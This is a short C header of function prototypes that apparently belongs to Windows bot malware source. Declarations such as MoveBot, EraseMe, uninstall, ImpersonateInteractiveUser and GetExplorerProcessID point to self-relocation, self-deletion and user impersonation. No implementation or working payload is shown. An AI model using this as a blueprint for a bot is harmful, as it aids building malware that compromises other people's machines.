#ifdef DEBUG
void DebugMsg(char *format, ...);
#endif

char *substr(char *input, int start, int end);

int SplitParams(char *a[MAX_TOKENS],char *line,int depth);
BOOL MoveBot(char *MTP,char *Bname);
int wildcardfit(char *wildcard, char *test);
void GetInstalledTime(void);

void EraseMe(BOOL nopause=FALSE);
void uninstall(BOOL thread=FALSE, BOOL difbot=FALSE);

#ifndef NO_FLUSHDNS
BOOL FlushDNSCache(void);
#endif

void    ImpersonateInteractiveUser(void);
BOOL    IsServiceRunning(char *name);
DWORD   GetExplorerProcessID(void);